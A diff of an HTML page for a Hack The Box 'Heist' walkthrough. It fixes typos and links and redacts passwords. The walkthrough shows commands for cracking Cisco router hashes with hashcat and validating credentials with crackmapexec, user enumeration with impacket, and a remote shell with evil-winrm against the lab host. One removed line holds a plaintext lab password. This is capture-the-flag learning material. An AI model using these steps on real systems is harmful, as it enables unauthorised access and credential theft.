@@ -7,12 +7,11 @@
 
 <body>
     <article>
-        <h1>HTB Walkthrough | Obscurity</h1>
+        <h1>HTB Walkthrough | Heist</h1>
         <div class="tag-container">
             <span class="tag">htb</span>
-            <span class="tag">linux</span>
-            <span class="tag">python</span>
-            <span class="tag">crypto</span>
+            <span class="tag">windows</span>
+            <span class="tag">smb</span>
         </div>
         <p class="last-update">Last updated on May 2020.</p>
 
@@ -21,12 +20,12 @@
         </p>
 
         <div class="step">
-            <p>1. After doing an initial scan with nmap, we find 3 exposed services: a web server on port 80, RPC on port 135 and SMBv2 on port 445.</p>
+            <p>1. After doing an initial scan with <strong>nmap</strong>, we find 3 exposed services: a web server on port 80, RPC on port 135 and SMBv2 on port 445.</p>
             <img class="step_img" src="/imgs/heist/img1.png"/>
         </div>
         <div class="step">
             <p>
-                2. After trying and failing to acess the SMB service with null credentials, I moved on to the web server.
+                2. After trying and failing to acess the <strong>SMB</strong> service with null credentials, I moved on to the web server.
             </p>
             <div class="code-block">
                 <div class="code-line">
@@ -47,8 +46,8 @@
         </div>
         <div class="step">
             <p>
-                4. The initial page redirects to the <a hred="http://heist.htb/login.php" target="_blank">login</a> page.<br>
-                After poking around a bit we realize that by adding <a hred="http://heist.htb/login.php?guest=true" target="_blank">guest=true</a> as a query parameter, we're redirected to an <a hred="http://heist.htb/issues.php" target="_blank">issues</a> page.<br>
+                4. The initial page redirects to the <a href="http://heist.htb/login.php" target="_blank">login</a> page.<br>
+                After poking around for a bit we realize that by adding <a href="http://heist.htb/login.php?guest=true" target="_blank">guest=true</a> as a query parameter, we're redirected to an <a href="http://heist.htb/issues.php" target="_blank">issues</a> page.<br>
                 On this page, there is what looks like a conversation between a user named Hazard and a member of the support team for a Cisco router.
             </p>
             <img class="step_img_md" src="/imgs/heist/img3.png"/>
@@ -64,14 +63,14 @@
         <div class="step">
             <p>6. This config file contains:</p>
             <ul>
-                <li>2 user passwords encrypted with a <a href="https://www.cisco.com/c/en/us/support/docs/security-vpn/remote-authentication-dial-user-service-radius/107614-64.html" target="_blank">weak algorithm</a> algorithm (7) which can be <a href="https://www.ifm.net.nz/cookbooks/passwordcracker.html" target="_blank">easily cracked</a>;</li>
+                <li>2 user passwords encrypted with a <a href="https://www.cisco.com/c/en/us/support/docs/security-vpn/remote-authentication-dial-user-service-radius/107614-64.html" target="_blank">weak algorithm</a> (7) which can be <a href="https://www.ifm.net.nz/cookbooks/passwordcracker.html" target="_blank">easily cracked</a>;</li>
                 <li>the <i>enable secret</i> password, which is an MD5 hash.</li>
             </ul>
-            <p>Also, this file let's us know that this router's passwords are at least 12 chars long.</p>
         </div>
 
         <div class="step">
-            <p>7. To crack the MD5 hash we use <a href="https://hashcat.net/hashcat/" target="_blank">hashcat</a> combined with the RockYou list, which we'll filter by words >= 12 chars.</p>
+            <p>7. To crack the MD5 hash we use <a href="https://hashcat.net/hashcat/" target="_blank">hashcat</a> combined with the RockYou list, which we'll filter by words >= 12 chars, since the config file let's us know that this router's passwords are at least 12 chars long.</p>
+        </p>
             <div class="code-block">
                 <div class="code-line">
                     <span class="prompt">root@kali:/#</span>
@@ -86,11 +85,11 @@
         </div>
 
         <div class="step">
-            <p>8. Now that we know Hazard router's password, we're going to use <a href="https://github.com/byt3bl33d3r/CrackMapExec">crackmapexec</a> to try and login as Hazard on the server.</p>
+            <p>8. Now that we know Hazard's router's password, we're going to use <a href="https://github.com/byt3bl33d3r/CrackMapExec">crackmapexec</a> to try and login as Hazard on the machine:</p>
             <div class="code-block">
                 <div class="code-line">
                     <span class="prompt">root@kali:/#</span>
-                    <code>crackmapexec heist.htb -u Hazard -p stealth1agent</code>
+                    <code>crackmapexec heist.htb -u Hazard -p <span style="color: red">xxx</span></code>
                 </div>
                 <div class="code-line">
                     <code>...</code>
@@ -99,21 +98,22 @@
                     <code>CME           heist.htb:445 SUPPORTDESK           [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SUPPORTDESK)</code>
                 </div>
                 <div class="code-line">
-                    <code>CME           heist.htb:445 SUPPORTDESK           [+] SUPPORTDESK\Hazard:xxx</code>
+                    <code>CME           heist.htb:445 SUPPORTDESK           [+] SUPPORTDESK\Hazard:<span style="color: red">xxx</span></code>
                 </div>
             </div>
         </div>
 
         <div class="step">
             <p>
-                9. So, we know now that the domain's name is SUPPORTDESK, that the server's SO is Windows 10 and that the credentials we found are valid for the server.<br>
+                9. So, we know now that the machine is a Windows 10, that it's a part of the SUPPORTDESK domain, and that the credentials we found are valid.<br>
                 To enumerate the domain's users, we're going to use <a href="https://github.com/SecureAuthCorp/impacket" target="_blank">Impacket</a>.
             </p>
             <div class="code-block">
                 <div class="code-line">
                     <span class="prompt">root@kali:/#</span>
-                    <code>python impacket/build/scripts-2.7/lookupsid.py SUPPORTDESK/Hazard:xxx@heist.htb</code>
+                    <code>python impacket/build/scripts-2.7/lookupsid.py SUPPORTDESK/Hazard:<span style="color: red">xxx</span>@heist.htb</code>
                 </div>
+                <br>
                 <div class="code-line">
                     <code>Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation</code>
                 </div>
@@ -128,31 +128,31 @@
                     <code>[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112</code>
                 </div>
                 <div class="code-line">
-                    <code>500: SUPPORTDESK\Administrator (SidTypeUser)</code>
+                    <code>500: SUPPORTDESK\<span style="color: greenyellow;">Administrator</span> (SidTypeUser)</code>
                 </div>
                 <div class="code-line">
-                    <code>501: SUPPORTDESK\Guest (SidTypeUser)</code>
+                    <code>501: SUPPORTDESK\<span style="color: greenyellow;">Guest</span> (SidTypeUser)</code>
                 </div>
                 <div class="code-line">
-                    <code>503: SUPPORTDESK\DefaultAccount (SidTypeUser)</code>
+                    <code>503: SUPPORTDESK\<span style="color: greenyellow;">DefaultAccount</span> (SidTypeUser)</code>
                 </div>
                 <div class="code-line">
-                    <code>504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)</code>
+                    <code>504: SUPPORTDESK\<span style="color: greenyellow;">WDAGUtilityAccount</span> (SidTypeUser)</code>
                 </div>
                 <div class="code-line">
-                    <code>513: SUPPORTDESK\None (SidTypeGroup)</code>
+                    <code>513: SUPPORTDESK\<span style="color: greenyellow;">None</span> (SidTypeGroup)</code>
                 </div>
                 <div class="code-line">
-                    <code>1008: SUPPORTDESK\Hazard (SidTypeUser)</code>
+                    <code>1008: SUPPORTDESK\<span style="color: greenyellow;">Hazard</span> (SidTypeUser)</code>
                 </div>
                 <div class="code-line">
-                    <code>1009: SUPPORTDESK\support (SidTypeUser)</code>
+                    <code>1009: SUPPORTDESK\<span style="color: greenyellow;">support</span> (SidTypeUser)</code>
                 </div>
                 <div class="code-line">
-                    <code>1012: SUPPORTDESK\Chase (SidTypeUser)</code>
+                    <code>1012: SUPPORTDESK\<span style="color: greenyellow;">Chase</span> (SidTypeUser)</code>
                 </div>
                 <div class="code-line">
-                    <code>1013: SUPPORTDESK\Jason (SidTypeUser)</code>
+                    <code>1013: SUPPORTDESK\<span style="color: greenyellow;">Jason</span> (SidTypeUser)</code>
                 </div>
             </div>
         </div>
@@ -169,14 +169,11 @@
         </div>
 
         <div class="step">
-            <p>11. We find that one of the credentials are valid for user Chase, so let's try to establish a remote connection for that user using Evil-RCM:</p>
+            <p>11. We find that one of the credentials are valid for Chase, so let's try to establish a remote connection for that user with <a href="https://github.com/Hackplayers/evil-winrm" target="_blank">Evil-WinRM</a>:</p>
             <div class="code-block">
                 <div class="code-line">
                     <span class="prompt">root@kali:/#</span>
-                    <code>ruby evil-winrm/evil-winrm.rb -i heist.htb -u Chase -p 'xxx'</code>
-                </div>
-                <div class="code-line">
-                    <code>Evil-WinRM shell v1.9</code>
+                    <code>ruby evil-winrm/evil-winrm.rb -i heist.htb -u Chase -p '<span style="color: red">xxx</span>'</code>
                 </div>
                 <div class="code-line">
                     <code>Evil-WinRM shell v1.9</code>
@@ -186,9 +183,6 @@
                 </div>
                 <div class="code-line">
                     <code>*Evil-WinRM* PS C:\Users\Chase\Documents>  </code>
-                </div>
-                <div class="code-line">
-                    <code>Evil-WinRM shell v1.9</code>
                 </div>
             </div>
         </div>
